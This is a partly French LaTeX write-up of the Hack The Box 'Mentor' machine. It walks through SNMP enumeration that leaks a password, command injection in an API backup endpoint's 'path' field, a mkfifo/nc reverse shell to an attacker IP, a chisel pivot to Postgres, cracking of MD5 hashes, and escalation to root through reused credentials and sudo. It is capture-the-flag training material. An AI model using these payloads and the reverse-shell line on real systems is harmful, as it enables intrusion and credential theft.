\chapter{[WIP] Mentor}
\begin{itemize}
    \item {\bf technics}: snmp, pivoting
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}



\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.193
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
|_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsection{http}

rien au niveau des hosts rien au niveau des fichiers :(

\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sU -v mentorquotes.htb
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
158/udp   open|filtered pcmail-srv
161/udp   open          snmp


$ sudo nmap -sU -p161,162 -sV  -sC mentorquotes.htb
PORT    STATE  SERVICE  VERSION
161/udp open   snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a124f60a99b99c6200000000
|   snmpEngineBoots: 67
|_  snmpEngineTime: 32m37s
| snmp-sysdescr: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
|_  System uptime: 32m36.70s (195670 timeticks)
162/udp closed snmptrap
Service Info: Host: mentor

\end{verbatim}

\subsection{snmp}
\begin{verbatim}
$ snmpbulkwalk -v2c -c public 10.10.11.193 .
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (213445) 0:35:34.45
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (0) 0:00:00.00
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (215334) 0:35:53.34
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2022-12-15,5:37:46.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 232
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

\end{verbatim}
rien
\subsection{http}
En fait ma requete d'enumeration des hosts n'était pas bonne car ne prenait pas
en compte les 404
\begin{verbatim}
$ ffuf -u http://mentorquotes.htb -H 'Host: FUZZ.mentorquotes.htb' -w raft-small-words-lowercase.txt
    -mc all -fw 18,26

api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 45ms]


$ ffuf -u http://api.mentorquotes.htb/FUZZ -w directory-list-2.3-medium.txt

docs                    [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 39ms]
users                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
admin                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
quotes                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
redoc                   [Status: 200, Size: 772, Words: 149, Lines: 28, Duration: 38ms]


$ curl -i http://api.mentorquotes.htb/docs    HTTP/1.1 200 OK
Date: Thu, 15 Dec 2022 09:14:24 GMT
Server: uvicorn
content-length: 969
content-type: text/html; charset=utf-8
Vary: Accept-Encoding


    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>MentorQuotes - Swagger UI</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
        dom_id: '#swagger-ui',
        presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
        layout: "BaseLayout",
        deepLinking: true,
        showExtensions: true,
        showCommonExtensions: true
    })
    </script>
    </body>
    </html>

\end{verbatim}

sur la page web on a un version jolie de la doc d'API et on peut voir aussi un
user \verb+james@mentorquotes.htb+

donc visiblement si on veut lister les useers il faut un header
\verb+Authorization+

\begin{verbatim}
 curl -s -X POST http://api.mentorquotes.htb/auth/signup -d @create.json -H 'Content-Type: application/json' |jq
{
  "detail": [
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "ensure this value has at least 8 characters",
      "type": "value_error.any_str.min_length",
      "ctx": {
        "limit_value": 8
      }
    }
  ]
}
$ curl -s -X POST http://api.mentorquotes.htb/auth/signup -d @create.json -H 'Content-Type: application/json' |jq
{
  "id": 4,
  "email": "jubeaz@example.com",
  "username": "jubeaz"
}

$ curl -s -X POST http://api.mentorquotes.htb/auth/login -d @create.json -H 'Content-Type: application/json' |jq
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imp1YmVheiIsImVtYWlsIjoianViZWF6QGV4YW1wbGUuY29tIn0.aRzrHAv8H2n-puAxwnukhwfep70E3d-Cf3CWF2eV1d8"

$ export TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imp1YmVheiIsImVtYWlsIjoianViZWF6QGV4YW1wbGUuY29tIn0.aRzrHAv8H2n-puAxwnukhwfep70E3d-Cf3CWF2eV1d8
$ curl -s  http://api.mentorquotes.htb/users/ -H "Authorization: $TOKEN" |jq
{
  "detail": "Only admin users can access this resource"
}

$ curl -s  http://api.mentorquotes.htb/users/4/ -H "Authorization: $TOKEN" |jq
{
  "detail": "Only admin users can access this resource"
}

\end{verbatim}

ok donc on a un token jwt

\begin{verbatim}
$ jwt-tool $TOKEN

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] username = "jubeaz"
[+] email = "jubeaz@example.com"
\end{verbatim}

pas crackable avec \verb+hashcat -a 0 -m 16500 jubeaz.token rockyou.txt+

si on essaie de manipuler le token sans  refaire la signature cela ne passe pas.


Les tentatives de creéation de compte montre que la clé d'unicité d'un compte
est sur le couple \verb+username/email+ et qu'il est déjà un compte
\verb+james/james@mentorquotes.htb+ mais que l'on ne peut pas mettre en defaut
l'algo qui determine si on est un admin en modifiant simplement l'un des deux
élément du couple.

\begin{verbatim}
$ curl -s -X POST http://api.mentorquotes.htb/auth/signup  
    -H 'Content-Type: application/json' 
    -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "password123"}'
    |jq
{
  "detail": "User already exists! "
}
$ curl -s -X POST http://api.mentorquotes.htb/auth/signup  
    -H 'Content-Type: application/json' 
    -d '{"email": "admin@mentorquotes.htb", "username": "admin", "password": "password123"}' 
    |jq
{
  "id": 4,
  "email": "admin@mentorquotes.htb",
  "username": "admin"
}
$ curl -s -X POST http://api.mentorquotes.htb/auth/signup  
    -H 'Content-Type: application/json' 
    -d '{"email": "admin@mentorquotes.htb", "username": "james", "password": "password123"}' 
    |jq
{
  "id": 5,
  "email": "admin@mentorquotes.htb",
  "username": "james"
}
$ curl -s -X POST http://api.mentorquotes.htb/auth/signup  
    -H 'Content-Type: application/json' 
    -d '{"email": "james@mentorquotes.htb", "username": "admin", "password": "password123"}' 
    |jq
{
  "id": 6,
  "email": "james@mentorquotes.htb",
  "username": "admin"
}
$ export TOKEN=$(curl -s -X POST http://api.mentorquotes.htb/auth/login  
        -H 'Content-Type: application/json' 
        -d '{"email": "james@mentorquotes.htb", "username": "admin", "password": "password123"}' 
        |jq |tr -d '"')
\end{verbatim}


donc on va repasser sur essayer de manipuler un json token en changeant: 

\begin{verbatim}
$ export TOKEN_INIT=$(curl -s -X POST http://api.mentorquotes.htb/auth/login  \
        -H 'Content-Type: application/json' \
        -d '{"email": "james@mentorquotes.htb", "username": "admin", "password": "password123"}' \
        |jq |tr -d '"')
jwt-tool \
    -I -pc username -pv james 
    -rh 'Content-Type: application/json' -rh "Authorization: $TOKEN_INIT" \
    -t http://api.mentorquotes.htb/users/ -M pb
\end{verbatim}


même en spoofed jks avec 
\begin{verbatim}
docker pull kennethreitz/httpbin
docker run -p 80:80 kennethreitz/httpbin
\end{verbatim}

rien n'y fait

\subsection{snmp}

\begin{verbatim}
$ snmpbulkwalk -v2c -c internal 10.10.11.193 . > snmp..txt
benmusashi@honbu:~/documents/pentesting-games/htb/mentor$ wc -l snmp..txt
9897 snmp..txt
benmusashi@honbu:~/documents/pentesting-games/htb/mentor$ grep ogin snmp..txt
HOST-RESOURCES-MIB::hrSWRunName.911 = STRING: "systemd-logind"
HOST-RESOURCES-MIB::hrSWRunName.1694 = STRING: "login.sh"
HOST-RESOURCES-MIB::hrSWRunName.2124 = STRING: "login.py"
HOST-RESOURCES-MIB::hrSWRunPath.911 = STRING: "/lib/systemd/systemd-logind"
HOST-RESOURCES-MIB::hrSWRunParameters.1694 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.2124 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
HOST-RESOURCES-MIB::hrSWInstalledName.478 = STRING: "login_1:4.8.1-2ubuntu2.1_amd64"
\end{verbatim}

ce n'est pas le password ssh

\begin{verbatim}
$ cat login.json
{ "email": "james@mentorquotes.htb", "username": "james", "password": "kj23sadkj123as0-d213" }
$ curl -s -X POST http://api.mentorquotes.htb/auth/login \
    -d @login.json -H 'Content-Type: application/json'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Nao0"

$ export TOKEN=$(curl -s -X POST http://api.mentorquotes.htb/auth/login \
    -d @login.json -H 'Content-Type: application/json'|jq |tr -d '"')
$ curl -s -X GET http://api.mentorquotes.htb/users/ -H "Authorization: $TOKEN" | jq
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  }
]

$ curl -s -X GET http://api.mentorquotes.htb/admin/ -H "Authorization: $TOKEN" | jq
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
$ curl -s -X GET http://api.mentorquotes.htb/admin/check -H "Authorization: $TOKEN" | jq
{
  "details": "Not implemented yet!"
}
$ curl -s -X GET http://api.mentorquotes.htb/admin/backup -H "Authorization: $TOKEN" | jq
{
  "detail": "Method Not Allowed"
}
$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H "Authorization: $TOKEN" | jq
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}

$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -d '{}' -H 'Content-type: application/json' -H "Authorization: $TOKEN" | jq
{
  "detail": [
    {
      "loc": [
        "body",
        "path"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
$ cat backup.json
{"body": "test", "path": "test"}

$ curl -s -X POST http://api.mentorquotes.htb/admin/backup \
    -d @backup.json -H 'Content-type: application/json' -H "Authorization: $TOKEN" | jq
{
  "INFO": "Done!"
}
\end{verbatim}


après pas mal d'essais on a une commande injection:
\begin{verbatim}
{"body": "test", "path": "test $(ping -c 2 10.10.16.3)"}
r$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:39:42.389954 IP api.mentorquotes.htb > honbu: ICMP echo request, id 9984, seq 0, length 64
08:39:42.389993 IP honbu > api.mentorquotes.htb: ICMP echo reply, id 9984, seq 0, length 64
08:39:43.327419 IP api.mentorquotes.htb > honbu: ICMP echo request, id 9984, seq 1, length 64


{"body": "test", "path": "test $(nc 10.10.16.3 4444)"}
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.193 33479
\end{verbatim}

\section{Foothold}
\subsection{x}
\begin{verbatim}
$ export TOKEN=$(curl -s -X POST http://api.mentorquotes.htb/auth/login \
-d @login.json -H 'Content-Type: application/json'|jq |tr -d '"')
$ echo backup.json
{"body": "test", "path": "test $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/f)"}
$ curl -s -X POST http://api.mentorquotes.htb/admin/backup \
-d @backup.json -H 'Content-type: application/json' -H "Authorization: $TOKEN" | jq

$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.193 35419
sh: can't access tty; job control turned off
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

\end{verbatim}

on a wget pour upload linpeas

\begin{verbatim}
"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db

$ ./chisel_1.7.7_linux_amd64 server -p 4445 --reverse
2022/12/24 13:03:40 server: Reverse tunnelling enabled
2022/12/24 13:03:40 server: Fingerprint L1CgudRTMhEy6hLs8beB1haUyRJxRaqma97MGlf0r/s=
2022/12/24 13:03:40 server: Listening on http://0.0.0.0:4445
2022/12/24 13:04:40 server: session#4: tun: proxy#R:55432=>172.22.0.1:5432: Listening

/app # ./chisel_1.7.7_linux_amd64 client --max-retry-count=1 10.10.16.3:4445 R:55432:172.22.0.1:5432
2022/12/24 12:04:39 client: Connecting to ws://10.10.16.3:4445
2022/12/24 12:04:40 client: Connected (Latency 28.553419ms)

$ psql -h 127.0.0.1 -p 55432 -Upostgres -W -d mentorquotes_db
Password:
psql (14.6, server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

# select * from users;
 id |         email          |  username   |             password
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
$ echo 53f22d0dfa10dce7e29cd31f4f953fd8 |hashid
Analyzing '53f22d0dfa10dce7e29cd31f4f953fd8'
[+] MD2
[+] MD5
[+] MD4

https://crackstation.net/
53f22d0dfa10dce7e29cd31f4f953fd8	md5	123meunomeeivani

\end{verbatim}

\subsection{svc}

\begin{verbatim}
$ ssh svc@mentorquotes.htb
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)

-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly

svc@mentor:~$ cat /etc/snmp/snmpd.conf
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

svc@mentor:~$ su james
Password:
james@mentor:/home/svc$ id
uid=1000(james) gid=1000(james) groups=1000(james)

james@mentor:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
james@mentor:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


